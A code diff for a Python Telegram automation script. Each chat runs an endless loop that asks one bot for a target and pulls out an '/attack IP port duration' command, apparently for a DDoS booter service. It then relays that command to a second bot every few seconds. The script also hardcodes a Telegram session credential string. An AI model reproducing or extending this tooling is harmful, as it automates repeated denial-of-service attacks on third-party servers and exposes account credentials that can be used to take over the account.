@@ -1,4 +1,3 @@
-
 import threading
 import asyncio
 import re
@@ -19,14 +18,16 @@ STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qU
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
-# chat_id -> target / task / future
-chat_targets: dict[int, str] = {}
-loop_tasks: dict[int, asyncio.Task] = {}
-waiting_futures: dict[int, asyncio.Future] = {}
+# PTB side state
+chat_targets: dict[int, str] = {}          # chat_id -> target
+loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> telethon loop task
+
+# BOT_A response waiters (same idea as old code)
+ip_waiters: dict[int, asyncio.Future] = {}  # chat_id -> Future for CMD
 bot_b_status = "UNKNOWN"
 
-# IP BOT response: "CMD: /attack 91.108.17.23 32003 30"
-IP_CMD_REGEX = re.compile(r"/attacks+S+s+d+s+d+", re.I)
+# /attack extract from "CMD: /attack 91.108.17.5 32001 30"
+CMD_LINE_REGEX = re.compile(r"CMD:s*`?(/attacks+S+s+d+s+d+)`?", re.I)
 
 
 # ------------- BOT-A LISTENER (IP BOT) -------------
@@ -35,15 +36,19 @@ async def bot_a_listener(event):
     text = event.text or ""
     print("IP BOT REPLY:", text)
 
-    # Sirf jab /attack pattern mile tabhi future resolve karo
-    if not IP_CMD_REGEX.search(text):
+    # Purane code ki tarah CMD line nikaalo
+    m = CMD_LINE_REGEX.search(text)
+    if not m:
         return
 
-    for cid, fut in list(waiting_futures.items()):
+    attack_cmd = m.group(1)
+    print("✅ EXTRACTED CMD:", attack_cmd)
+
+    # Sare pending chats ko CMD de do (per-chat mapping)
+    for chat_id, fut in list(ip_waiters.items()):
         if not fut.done():
-            fut.set_result(text)
-            waiting_futures.pop(cid, None)
-            break
+            fut.set_result(attack_cmd)
+        ip_waiters.pop(chat_id, None)
 
 
 # ------------- BOT-B LISTENER (TASK BOT) -------------
@@ -63,7 +68,7 @@ async def bot_b_listener(event):
 
 # ------------- CORE LOOP PER CHAT (Telethon loop) -------------
 async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Har chat ke liye IP BOT se /attack cmd lekar BOT_B ko bhejta rahega."""
+    """Har chat ke liye: IP BOT se CMD lo, BOT_B ko bhejo, loop repeat."""
     global bot_b_status
 
     while True:
@@ -71,26 +76,20 @@ async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         if not target:
             return
 
-        # 1) IP BOT se .getip all
+        # 1) IP BOT se .getip all <target> maango
         fut = tele.loop.create_future()
-        waiting_futures[chat_id] = fut
+        ip_waiters[chat_id] = fut
 
         await tele.send_message(BOT_A, f".getip all {target}")
+        await context.bot.send_message(chat_id, "📡 Asking IP bot for CMD…")
 
         try:
-            reply = await asyncio.wait_for(fut, timeout=60)
+            attack_cmd = await asyncio.wait_for(fut, timeout=60)
         except asyncio.TimeoutError:
-            await context.bot.send_message(chat_id, "⏱️ IP bot timeout, retrying...")
+            await context.bot.send_message(chat_id, "⏱️ IP bot timeout, retrying…")
+            ip_waiters.pop(chat_id, None)
             await asyncio.sleep(5)
             continue
-
-        match = IP_CMD_REGEX.search(reply or "")
-        if not match:
-            await context.bot.send_message(chat_id, "ℹ️ No /attack CMD found, retrying...")
-            await asyncio.sleep(5)
-            continue
-
-        attack_cmd = match.group(0)
 
         # 2) BOT_B READY hone tak wait
         while True:
@@ -103,7 +102,9 @@ async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         # 3) BOT_B ko /attack bhejo
         await tele.send_message(BOT_B, attack_cmd)
         await context.bot.send_message(
-            chat_id,f"✅ Task sent:`{attack_cmd}`",
+            chat_id,
+            f"✅ Task sent:
+`{attack_cmd}`",
             parse_mode="Markdown",
         )
         await asyncio.sleep(3)
